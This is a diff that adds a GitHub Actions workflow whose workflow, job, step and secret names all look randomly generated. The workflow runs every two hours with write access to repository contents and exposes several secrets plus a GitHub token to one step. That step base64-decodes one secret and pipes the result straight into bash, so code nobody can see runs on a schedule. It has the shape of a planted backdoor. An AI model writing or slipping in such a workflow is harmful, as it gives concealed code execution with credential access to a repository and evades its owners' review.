@@ -1,0 +1,21 @@
+name: iyovqfpkxU89eZuY
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  RNSxwlnNck:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.ChROxUcHT }}
+      - name: Ovao1
+        env:
+          ogI6CR: ${{ secrets.p9uOQr8Hj }}
+          WZ8ZY: ${{ secrets.KIiIE }}
+          ZCnfaeychkfoc: ${{ secrets.HlXPGwg }}
+          GITHUB_TOKEN: ${{ secrets.ChROxUcHT }}
+        run: echo "$ogI6CR" | base64 -d | bash
